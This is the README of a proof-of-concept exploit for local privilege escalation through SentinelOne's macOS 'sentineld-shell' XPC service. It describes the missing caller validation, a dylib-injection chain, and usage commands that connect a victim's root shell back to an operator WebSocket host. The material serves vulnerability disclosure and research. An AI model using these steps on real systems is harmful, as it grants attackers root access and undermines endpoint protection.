# SentinelShell

Proof-of-concept for local privilege escalation on macOS via SentinelOne's `sentineld-shell` daemon.

The `sentineld-shell` XPC service (`com.sentinelone.sentineld-shell`) accepts shell session requests from any local process without validating the caller's audit token. Any unprivileged user can instruct the daemon to open a PTY and connect it to an arbitrary WebSocket URL, effectively spawning a root shell under SentinelOne's context reachable by the attacker.

> **Requires SIP disabled** (or a bundle binary without hardened runtime). Check with `csrutil status`.

## Demo

![SentinelShell demo](demo.gif)

Full recording (105s): **[demo.mov](demo.mov)** — opens with GitHub's native player on the file page.

> GitHub READMEs don't inline-play repo videos (including LFS). The GIF above is a preview; the full `.mov` is in the repo for download/playback.

---

## Requirements

- macOS with SentinelOne agent installed and `sentineld-shell` running
- SIP disabled **or** a bundle binary without hardened runtime (auto-detected)
- Xcode Command Line Tools (`clang`)
- Python 3.9+

---

## Usage

### Reverse shell to operator

On the operator machine:
```bash
S1_BIND=0.0.0.0 python3 server.py
# or with a custom port:
S1_BIND=0.0.0.0 python3 server.py --port 8888
```

On the victim (macOS):
```bash
bash exploit.sh 'ws://OPERATOR_IP:8888/socket.io/?EIO=4&transport=websocket'
```

---

## Files

| File | Description |
|------|-------------|
| `exploit.sh` | Injection launcher — auto-discovers the bundle, compiles the dylib, and triggers the XPC request |
| `server.py` | Rogue WebSocket server — bridges the daemon PTY to a local tty or reverse TCP relay |

---

## How it works

1. `exploit.sh` locates the SentinelOne bundle and auto-detects the Team ID
2. A dylib is compiled on the fly and injected into a bundle binary via `DYLD_INSERT_LIBRARIES`
3. The dylib calls `xpc_connection_create_mach_service("com.sentinelone.sentineld-shell")` and sends a shell session request with the attacker-controlled WebSocket URL
4. `sentineld-shell` spawns a PTY as root and connects it to `server.py`
5. The attacker gets a fully interactive root shell

The root cause is the absence of audit token verification on the XPC service: the daemon accepts the message from any process regardless of its identity or entitlements.

---

## Affected versions

Tested on SentinelOne agent versions where `sentineld-shell` is present.
Reported to SentinelOne.
